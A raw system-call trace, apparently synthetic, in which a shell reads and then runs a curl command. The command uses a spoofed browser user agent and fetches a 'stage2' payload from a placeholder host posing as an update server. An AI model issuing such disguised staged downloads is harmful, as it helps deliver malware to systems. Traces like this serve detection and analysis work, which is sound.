9     14:56:49.556085 rt_sigaction(SIGINT, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x79f01427e330}, {sa_handler=0x63f00dda8750, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x79f01427e330}, 8) = 0
9     14:56:49.556440 ioctl(2<pipe:[2810]>, TIOCGWINSZ, 0x7fff19398f90) = -1 ENOTTY (Inappropriate ioctl for device)
9     14:56:49.556863 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
9     14:56:49.557318 --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=22, si_uid=1001, si_status=6, si_utime=0, si_stime=0} ---
9     14:56:49.557872 wait4(-1, 0x7fff19398910, WNOHANG, NULL) = 0
9     14:56:49.558443 rt_sigreturn({mask=[]}) = 0
9     14:56:49.559037 read(0<pipe:[589]>, " ", 1) = 1
9     14:56:49.559631 read(0<pipe:[589]>, " ", 1) = 1
9     14:56:49.560130 read(0<pipe:[589]>, " ", 1) = 1
9     14:56:49.560578 read(0<pipe:[589]>, " ", 1) = 1
9     14:56:49.560975 read(0<pipe:[589]>, "c", 1) = 1
9     14:56:49.561336 read(0<pipe:[589]>, "u", 1) = 1
9     14:56:49.561675 read(0<pipe:[589]>, "r", 1) = 1
9     14:56:49.562025 read(0<pipe:[589]>, "l", 1) = 1
9     14:56:49.562382 read(0<pipe:[589]>, " ", 1) = 1
9     14:56:49.562774 read(0<pipe:[589]>, "-", 1) = 1
9     14:56:49.563138 read(0<pipe:[589]>, "s", 1) = 1
9     14:56:49.563517 read(0<pipe:[589]>, " ", 1) = 1
9     14:56:49.563855 read(0<pipe:[589]>, "-", 1) = 1
9     14:56:49.564199 read(0<pipe:[589]>, "A", 1) = 1
9     14:56:49.564549 read(0<pipe:[589]>, " ", 1) = 1
9     14:56:49.564887 read(0<pipe:[589]>, "\"", 1) = 1
9     14:56:49.565228 read(0<pipe:[589]>, "M", 1) = 1
9     14:56:49.565590 read(0<pipe:[589]>, "o", 1) = 1
9     14:56:49.565947 read(0<pipe:[589]>, "z", 1) = 1
9     14:56:49.566298 read(0<pipe:[589]>, "i", 1) = 1
9     14:56:49.566653 read(0<pipe:[589]>, "l", 1) = 1
9     14:56:49.567014 read(0<pipe:[589]>, "l", 1) = 1
9     14:56:49.567320 read(0<pipe:[589]>, "a", 1) = 1
9     14:56:49.567623 read(0<pipe:[589]>, "/", 1) = 1
9     14:56:49.567927 read(0<pipe:[589]>, "5", 1) = 1
9     14:56:49.568241 read(0<pipe:[589]>, ".", 1) = 1
9     14:56:49.568543 read(0<pipe:[589]>, "0", 1) = 1
9     14:56:49.568856 read(0<pipe:[589]>, " ", 1) = 1
9     14:56:49.569157 read(0<pipe:[589]>, "(", 1) = 1
9     14:56:49.569458 read(0<pipe:[589]>, "W", 1) = 1
9     14:56:49.569758 read(0<pipe:[589]>, "i", 1) = 1
9     14:56:49.570074 read(0<pipe:[589]>, "n", 1) = 1
9     14:56:49.570403 read(0<pipe:[589]>, "d", 1) = 1
9     14:56:49.570777 read(0<pipe:[589]>, "o", 1) = 1
9     14:56:49.571098 read(0<pipe:[589]>, "w", 1) = 1
9     14:56:49.571435 read(0<pipe:[589]>, "s", 1) = 1
9     14:56:49.571836 read(0<pipe:[589]>, " ", 1) = 1
9     14:56:49.572187 read(0<pipe:[589]>, "N", 1) = 1
9     14:56:49.572489 read(0<pipe:[589]>, "T", 1) = 1
9     14:56:49.572787 read(0<pipe:[589]>, " ", 1) = 1
9     14:56:49.573103 read(0<pipe:[589]>, "1", 1) = 1
9     14:56:49.573400 read(0<pipe:[589]>, "0", 1) = 1
9     14:56:49.573700 read(0<pipe:[589]>, ".", 1) = 1
9     14:56:49.574183 read(0<pipe:[589]>, "0", 1) = 1
9     14:56:49.574647 read(0<pipe:[589]>, ";", 1) = 1
9     14:56:49.575023 read(0<pipe:[589]>, " ", 1) = 1
9     14:56:49.575407 read(0<pipe:[589]>, "W", 1) = 1
9     14:56:49.575754 read(0<pipe:[589]>, "i", 1) = 1
9     14:56:49.576183 read(0<pipe:[589]>, "n", 1) = 1
9     14:56:49.576486 read(0<pipe:[589]>, "6", 1) = 1
9     14:56:49.576846 read(0<pipe:[589]>, "4", 1) = 1
9     14:56:49.577254 read(0<pipe:[589]>, ";", 1) = 1
9     14:56:49.577613 read(0<pipe:[589]>, " ", 1) = 1
9     14:56:49.577925 read(0<pipe:[589]>, "x", 1) = 1
9     14:56:49.578236 read(0<pipe:[589]>, "6", 1) = 1
9     14:56:49.578548 read(0<pipe:[589]>, "4", 1) = 1
9     14:56:49.578887 read(0<pipe:[589]>, ")", 1) = 1
9     14:56:49.579192 read(0<pipe:[589]>, " ", 1) = 1
9     14:56:49.579493 read(0<pipe:[589]>, "A", 1) = 1
9     14:56:49.579792 read(0<pipe:[589]>, "p", 1) = 1
9     14:56:49.580094 read(0<pipe:[589]>, "p", 1) = 1
9     14:56:49.580398 read(0<pipe:[589]>, "l", 1) = 1
9     14:56:49.580741 read(0<pipe:[589]>, "e", 1) = 1
9     14:56:49.581083 read(0<pipe:[589]>, "W", 1) = 1
9     14:56:49.581384 read(0<pipe:[589]>, "e", 1) = 1
9     14:56:49.581697 read(0<pipe:[589]>, "b", 1) = 1
9     14:56:49.582002 read(0<pipe:[589]>, "K", 1) = 1
9     14:56:49.582304 read(0<pipe:[589]>, "i", 1) = 1
9     14:56:49.582656 read(0<pipe:[589]>, "t", 1) = 1
9     14:56:49.582966 read(0<pipe:[589]>, "/", 1) = 1
9     14:56:49.583306 read(0<pipe:[589]>, "5", 1) = 1
9     14:56:49.583611 read(0<pipe:[589]>, "3", 1) = 1
9     14:56:49.583925 read(0<pipe:[589]>, "7", 1) = 1
9     14:56:49.584263 read(0<pipe:[589]>, ".", 1) = 1
9     14:56:49.584593 read(0<pipe:[589]>, "3", 1) = 1
9     14:56:49.584952 read(0<pipe:[589]>, "6", 1) = 1
9     14:56:49.585275 read(0<pipe:[589]>, "\"", 1) = 1
9     14:56:49.585586 read(0<pipe:[589]>, " ", 1) = 1
9     14:56:49.585887 read(0<pipe:[589]>, "-", 1) = 1
9     14:56:49.586247 read(0<pipe:[589]>, "-", 1) = 1
9     14:56:49.586691 read(0<pipe:[589]>, "c", 1) = 1
9     14:56:49.587063 read(0<pipe:[589]>, "o", 1) = 1
9     14:56:49.587371 read(0<pipe:[589]>, "n", 1) = 1
9     14:56:49.587689 read(0<pipe:[589]>, "n", 1) = 1
9     14:56:49.588035 read(0<pipe:[589]>, "e", 1) = 1
9     14:56:49.588339 read(0<pipe:[589]>, "c", 1) = 1
9     14:56:49.588691 read(0<pipe:[589]>, "t", 1) = 1
9     14:56:49.589022 read(0<pipe:[589]>, "-", 1) = 1
9     14:56:49.589324 read(0<pipe:[589]>, "t", 1) = 1
9     14:56:49.589722 read(0<pipe:[589]>, "i", 1) = 1
9     14:56:49.590068 read(0<pipe:[589]>, "m", 1) = 1
9     14:56:49.590374 read(0<pipe:[589]>, "e", 1) = 1
9     14:56:49.591079 read(0<pipe:[589]>, "o", 1) = 1
9     14:56:49.591520 read(0<pipe:[589]>, "u", 1) = 1
9     14:56:49.592103 read(0<pipe:[589]>, "t", 1) = 1
9     14:56:49.592505 read(0<pipe:[589]>, " ", 1) = 1
9     14:56:49.592920 read(0<pipe:[589]>, "5", 1) = 1
9     14:56:49.593359 read(0<pipe:[589]>, " ", 1) = 1
9     14:56:49.593794 read(0<pipe:[589]>, "\"", 1) = 1
9     14:56:49.594235 read(0<pipe:[589]>, "h", 1) = 1
9     14:56:49.594595 read(0<pipe:[589]>, "t", 1) = 1
9     14:56:49.594963 read(0<pipe:[589]>, "t", 1) = 1
9     14:56:49.595324 read(0<pipe:[589]>, "p", 1) = 1
9     14:56:49.595751 read(0<pipe:[589]>, ":", 1) = 1
9     14:56:49.596149 read(0<pipe:[589]>, "/", 1) = 1
9     14:56:49.596513 read(0<pipe:[589]>, "/", 1) = 1
9     14:56:49.596929 read(0<pipe:[589]>, "u", 1) = 1
9     14:56:49.597282 read(0<pipe:[589]>, "p", 1) = 1
9     14:56:49.597686 read(0<pipe:[589]>, "d", 1) = 1
9     14:56:49.598103 read(0<pipe:[589]>, "a", 1) = 1
9     14:56:49.598505 read(0<pipe:[589]>, "t", 1) = 1
9     14:56:49.598900 read(0<pipe:[589]>, "e", 1) = 1
9     14:56:49.599272 read(0<pipe:[589]>, "-", 1) = 1
9     14:56:49.599663 read(0<pipe:[589]>, "s", 1) = 1
9     14:56:49.600028 read(0<pipe:[589]>, "e", 1) = 1
9     14:56:49.600364 read(0<pipe:[589]>, "r", 1) = 1
9     14:56:49.600715 read(0<pipe:[589]>, "v", 1) = 1
9     14:56:49.601112 read(0<pipe:[589]>, "e", 1) = 1
9     14:56:49.601508 read(0<pipe:[589]>, "r", 1) = 1
9     14:56:49.601919 read(0<pipe:[589]>, "-", 1) = 1
9     14:56:49.602366 read(0<pipe:[589]>, "p", 1) = 1
9     14:56:49.602707 read(0<pipe:[589]>, "l", 1) = 1
9     14:56:49.603062 read(0<pipe:[589]>, "a", 1) = 1
9     14:56:49.603408 read(0<pipe:[589]>, "c", 1) = 1
9     14:56:49.603754 read(0<pipe:[589]>, "e", 1) = 1
9     14:56:49.604084 read(0<pipe:[589]>, "h", 1) = 1
9     14:56:49.604390 read(0<pipe:[589]>, "o", 1) = 1
9     14:56:49.604695 read(0<pipe:[589]>, "l", 1) = 1
9     14:56:49.604999 read(0<pipe:[589]>, "d", 1) = 1
9     14:56:49.605305 read(0<pipe:[589]>, "e", 1) = 1
9     14:56:49.605650 read(0<pipe:[589]>, "r", 1) = 1
9     14:56:49.605986 read(0<pipe:[589]>, ".", 1) = 1
9     14:56:49.606291 read(0<pipe:[589]>, "l", 1) = 1
9     14:56:49.606647 read(0<pipe:[589]>, "o", 1) = 1
9     14:56:49.607026 read(0<pipe:[589]>, "c", 1) = 1
9     14:56:49.607450 read(0<pipe:[589]>, "a", 1) = 1
9     14:56:49.607860 read(0<pipe:[589]>, "l", 1) = 1
9     14:56:49.608259 read(0<pipe:[589]>, "/", 1) = 1
9     14:56:49.608642 read(0<pipe:[589]>, "d", 1) = 1
9     14:56:49.609005 read(0<pipe:[589]>, "o", 1) = 1
9     14:56:49.609326 read(0<pipe:[589]>, "w", 1) = 1
9     14:56:49.609641 read(0<pipe:[589]>, "n", 1) = 1
9     14:56:49.609944 read(0<pipe:[589]>, "l", 1) = 1
9     14:56:49.610246 read(0<pipe:[589]>, "o", 1) = 1
9     14:56:49.610552 read(0<pipe:[589]>, "a", 1) = 1
9     14:56:49.610869 read(0<pipe:[589]>, "d", 1) = 1
9     14:56:49.611171 read(0<pipe:[589]>, "?", 1) = 1
9     14:56:49.611475 read(0<pipe:[589]>, "p", 1) = 1
9     14:56:49.611778 read(0<pipe:[589]>, "a", 1) = 1
9     14:56:49.612096 read(0<pipe:[589]>, "y", 1) = 1
9     14:56:49.612405 read(0<pipe:[589]>, "l", 1) = 1
9     14:56:49.612708 read(0<pipe:[589]>, "o", 1) = 1
9     14:56:49.613010 read(0<pipe:[589]>, "a", 1) = 1
9     14:56:49.613311 read(0<pipe:[589]>, "d", 1) = 1
9     14:56:49.613613 read(0<pipe:[589]>, "=", 1) = 1
9     14:56:49.613916 read(0<pipe:[589]>, "s", 1) = 1
9     14:56:49.614221 read(0<pipe:[589]>, "t", 1) = 1
9     14:56:49.614596 read(0<pipe:[589]>, "a", 1) = 1
9     14:56:49.614913 read(0<pipe:[589]>, "g", 1) = 1
9     14:56:49.615237 read(0<pipe:[589]>, "e", 1) = 1
9     14:56:49.615538 read(0<pipe:[589]>, "2", 1) = 1
9     14:56:49.615839 read(0<pipe:[589]>, "\"", 1) = 1
9     14:56:49.616217 read(0<pipe:[589]>, "\n", 1) = 1
9     14:56:49.616577 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
9     14:56:49.616948 rt_sigprocmask(SIG_BLOCK, [INT TERM CHLD], [], 8) = 0
9     14:56:49.617255 clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0x79f014237e50) = 24
24    14:56:49.617799 set_robust_list(0x79f014237e60, 24 <unfinished ...>
9     14:56:49.617955 rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
24    14:56:49.618107 <... set_robust_list resumed>) = 0
9     14:56:49.618246 <... rt_sigprocmask resumed>NULL, 8) = 0
24    14:56:49.618392 getpid( <unfinished ...>
9     14:56:49.618548 rt_sigprocmask(SIG_BLOCK, [CHLD],  <unfinished ...>
24    14:56:49.618756 <... getpid resumed>) = 24
9     14:56:49.618909 <... rt_sigprocmask resumed>[], 8) = 0
24    14:56:49.619060 rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
9     14:56:49.619201 rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
24    14:56:49.619351 <... rt_sigprocmask resumed>NULL, 8) = 0
9     14:56:49.619502 <... rt_sigprocmask resumed>NULL, 8) = 0
24    14:56:49.619645 rt_sigaction(SIGTSTP, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x79f01427e330},  <unfinished ...>
9     14:56:49.619793 rt_sigprocmask(SIG_BLOCK, [CHLD],  <unfinished ...>
24    14:56:49.619949 <... rt_sigaction resumed>{sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x79f01427e330}, 8) = 0
9     14:56:49.620120 <... rt_sigprocmask resumed>[], 8) = 0
24    14:56:49.620255 rt_sigaction(SIGTTIN, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x79f01427e330},  <unfinished ...>
9     14:56:49.620391 rt_sigaction(SIGINT, {sa_handler=0x63f00dda8750, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x79f01427e330},  <unfinished ...>
24    14:56:49.620542 <... rt_sigaction resumed>{sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x79f01427e330}, 8) = 0
9     14:56:49.620684 <... rt_sigaction resumed>{sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x79f01427e330}, 8) = 0
24    14:56:49.620872 rt_sigaction(SIGTTOU, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x79f01427e330},  <unfinished ...>
9     14:56:49.621040 wait4(-1,  <unfinished ...>
24    14:56:49.621181 <... rt_sigaction resumed>{sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x79f01427e330}, 8) = 0
24    14:56:49.621392 rt_sigaction(SIGINT, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x79f01427e330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x79f01427e330}, 8) = 0
24    14:56:49.621737 rt_sigaction(SIGQUIT, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x79f01427e330}, {sa_handler=SIG_IGN, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x79f01427e330}, 8) = 0
24    14:56:49.622088 rt_sigaction(SIGCHLD, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x79f01427e330}, {sa_handler=0x63f00dda6230, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x79f01427e330}, 8) = 0
24    14:56:49.622459 execve("/usr/bin/curl", ["curl", "-s", "-A", "Mozilla/5.0 (Windows NT 10.0; Wi"..., "--connect-timeout", "5", "http://update-server-placeholder"...], 0x63f037b0d640 /* 9 vars */) = 0
24    14:56:49.623177 brk(NULL)         = 0x58b33a05c000
24    14:56:49.623576 mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x74b3a8131000
24    14:56:49.624167 openat(AT_FDCWD</sandbox>, "/lib/libfake_tracer.so", O_RDONLY|O_CLOEXEC) = 3</usr/lib/libfake_tracer.so>
24    14:56:49.625133 read(3</usr/lib/libfake_tracer.so>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
24    14:56:49.625683 fstat(3</usr/lib/libfake_tracer.so>, {st_mode=S_IFREG|0777, st_size=16376, ...}) = 0
24    14:56:49.626330 mmap(NULL, 19160, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/libfake_tracer.so>, 0) = 0x74b3a812c000
24    14:56:49.626767 mmap(0x74b3a812d000, 4096, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/libfake_tracer.so>, 0x1000) = 0x74b3a812d000
24    14:56:49.627154 mmap(0x74b3a812e000, 4096, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/libfake_tracer.so>, 0x2000) = 0x74b3a812e000
24    14:56:49.627500 mmap(0x74b3a812f000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/libfake_tracer.so>, 0x2000) = 0x74b3a812f000
24    14:56:49.627838 close(3</usr/lib/libfake_tracer.so>) = 0
24    14:56:49.628143 access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
24    14:56:49.628464 openat(AT_FDCWD</sandbox>, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3</etc/ld.so.cache>
24    14:56:49.628793 fstat(3</etc/ld.so.cache>, {st_mode=S_IFREG|0644, st_size=7295, ...}) = 0
24    14:56:49.629096 mmap(NULL, 7295, PROT_READ, MAP_PRIVATE, 3</etc/ld.so.cache>, 0) = 0x74b3a812a000
24    14:56:49.629405 close(3</etc/ld.so.cache>) = 0
24    14:56:49.629708 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libcurl.so.4", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libcurl.so.4.8.0>
24    14:56:49.630039 read(3</usr/lib/x86_64-linux-gnu/libcurl.so.4.8.0>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
24    14:56:49.630343 fstat(3</usr/lib/x86_64-linux-gnu/libcurl.so.4.8.0>, {st_mode=S_IFREG|0644, st_size=786336, ...}) = 0
24    14:56:49.630673 mmap(NULL, 789456, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libcurl.so.4.8.0>, 0) = 0x74b3a8069000
24    14:56:49.631016 mmap(0x74b3a807a000, 573440, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libcurl.so.4.8.0>, 0x11000) = 0x74b3a807a000
24    14:56:49.631389 mmap(0x74b3a8106000, 118784, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libcurl.so.4.8.0>, 0x9d000) = 0x74b3a8106000
24    14:56:49.631704 mmap(0x74b3a8123000, 28672, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libcurl.so.4.8.0>, 0xb9000) = 0x74b3a8123000
24    14:56:49.632069 close(3</usr/lib/x86_64-linux-gnu/libcurl.so.4.8.0>) = 0
24    14:56:49.632430 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libz.so.1", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libz.so.1.3>
24    14:56:49.632846 read(3</usr/lib/x86_64-linux-gnu/libz.so.1.3>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
24    14:56:49.633194 fstat(3</usr/lib/x86_64-linux-gnu/libz.so.1.3>, {st_mode=S_IFREG|0644, st_size=113000, ...}) = 0
24    14:56:49.633583 mmap(NULL, 110744, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libz.so.1.3>, 0) = 0x74b3a804d000
24    14:56:49.633936 mmap(0x74b3a804f000, 73728, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libz.so.1.3>, 0x2000) = 0x74b3a804f000
24    14:56:49.634287 mmap(0x74b3a8061000, 24576, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libz.so.1.3>, 0x14000) = 0x74b3a8061000
24    14:56:49.634641 mmap(0x74b3a8067000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libz.so.1.3>, 0x1a000) = 0x74b3a8067000
24    14:56:49.635003 close(3</usr/lib/x86_64-linux-gnu/libz.so.1.3>) = 0
24    14:56:49.635339 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libc.so.6>
24    14:56:49.635725 read(3</usr/lib/x86_64-linux-gnu/libc.so.6>, "\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\220\243\2\0\0\0\0\0"..., 832) = 832
24    14:56:49.636062 pread64(3</usr/lib/x86_64-linux-gnu/libc.so.6>, "\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0"..., 784, 64) = 784
24    14:56:49.636397 fstat(3</usr/lib/x86_64-linux-gnu/libc.so.6>, {st_mode=S_IFREG|0755, st_size=2125328, ...}) = 0
24    14:56:49.636796 pread64(3</usr/lib/x86_64-linux-gnu/libc.so.6>, "\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0"..., 784, 64) = 784
24    14:56:49.637188 mmap(NULL, 2170256, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libc.so.6>, 0) = 0x74b3a7e3b000
24    14:56:49.637526 mmap(0x74b3a7e63000, 1605632, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libc.so.6>, 0x28000) = 0x74b3a7e63000
24    14:56:49.637870 mmap(0x74b3a7feb000, 323584, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libc.so.6>, 0x1b0000) = 0x74b3a7feb000
24    14:56:49.638209 mmap(0x74b3a803a000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libc.so.6>, 0x1fe000) = 0x74b3a803a000
24    14:56:49.638556 mmap(0x74b3a8040000, 52624, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x74b3a8040000
24    14:56:49.638947 close(3</usr/lib/x86_64-linux-gnu/libc.so.6>) = 0
24    14:56:49.639287 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libnghttp2.so.14", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libnghttp2.so.14.26.0>
24    14:56:49.639649 read(3</usr/lib/x86_64-linux-gnu/libnghttp2.so.14.26.0>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
24    14:56:49.639985 fstat(3</usr/lib/x86_64-linux-gnu/libnghttp2.so.14.26.0>, {st_mode=S_IFREG|0644, st_size=170352, ...}) = 0
24    14:56:49.640511 mmap(NULL, 172272, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libnghttp2.so.14.26.0>, 0) = 0x74b3a7e10000
24    14:56:49.641087 mmap(0x74b3a7e15000, 90112, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libnghttp2.so.14.26.0>, 0x5000) = 0x74b3a7e15000
24    14:56:49.641552 mmap(0x74b3a7e2b000, 49152, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libnghttp2.so.14.26.0>, 0x1b000) = 0x74b3a7e2b000
24    14:56:49.641931 mmap(0x74b3a7e37000, 16384, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libnghttp2.so.14.26.0>, 0x26000) = 0x74b3a7e37000
24    14:56:49.642344 close(3</usr/lib/x86_64-linux-gnu/libnghttp2.so.14.26.0>) = 0
24    14:56:49.642706 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libidn2.so.0", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libidn2.so.0.4.0>
24    14:56:49.643126 read(3</usr/lib/x86_64-linux-gnu/libidn2.so.0.4.0>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
24    14:56:49.643474 fstat(3</usr/lib/x86_64-linux-gnu/libidn2.so.0.4.0>, {st_mode=S_IFREG|0644, st_size=133192, ...}) = 0
24    14:56:49.643813 mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x74b3a7e0e000
24    14:56:49.644163 mmap(NULL, 135184, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libidn2.so.0.4.0>, 0) = 0x74b3a7dec000
24    14:56:49.644520 mmap(0x74b3a7dee000, 16384, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libidn2.so.0.4.0>, 0x2000) = 0x74b3a7dee000
24    14:56:49.644864 mmap(0x74b3a7df2000, 106496, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libidn2.so.0.4.0>, 0x6000) = 0x74b3a7df2000
24    14:56:49.645202 mmap(0x74b3a7e0c000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libidn2.so.0.4.0>, 0x1f000) = 0x74b3a7e0c000
24    14:56:49.645558 close(3</usr/lib/x86_64-linux-gnu/libidn2.so.0.4.0>) = 0
24    14:56:49.645920 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/librtmp.so.1", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/librtmp.so.1>
24    14:56:49.646278 read(3</usr/lib/x86_64-linux-gnu/librtmp.so.1>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
24    14:56:49.646676 fstat(3</usr/lib/x86_64-linux-gnu/librtmp.so.1>, {st_mode=S_IFREG|0644, st_size=121848, ...}) = 0
24    14:56:49.647075 mmap(NULL, 119712, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/librtmp.so.1>, 0) = 0x74b3a7dce000
24    14:56:49.647439 mmap(0x74b3a7dd3000, 69632, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/librtmp.so.1>, 0x5000) = 0x74b3a7dd3000
24    14:56:49.647805 mmap(0x74b3a7de4000, 24576, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/librtmp.so.1>, 0x16000) = 0x74b3a7de4000
24    14:56:49.648145 mmap(0x74b3a7dea000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/librtmp.so.1>, 0x1c000) = 0x74b3a7dea000
24    14:56:49.648506 close(3</usr/lib/x86_64-linux-gnu/librtmp.so.1>) = 0
24    14:56:49.648848 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libssh.so.4", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libssh.so.4.9.6>
24    14:56:49.649250 read(3</usr/lib/x86_64-linux-gnu/libssh.so.4.9.6>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
24    14:56:49.649611 fstat(3</usr/lib/x86_64-linux-gnu/libssh.so.4.9.6>, {st_mode=S_IFREG|0644, st_size=462360, ...}) = 0
24    14:56:49.649967 mmap(NULL, 464400, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libssh.so.4.9.6>, 0) = 0x74b3a7d5c000
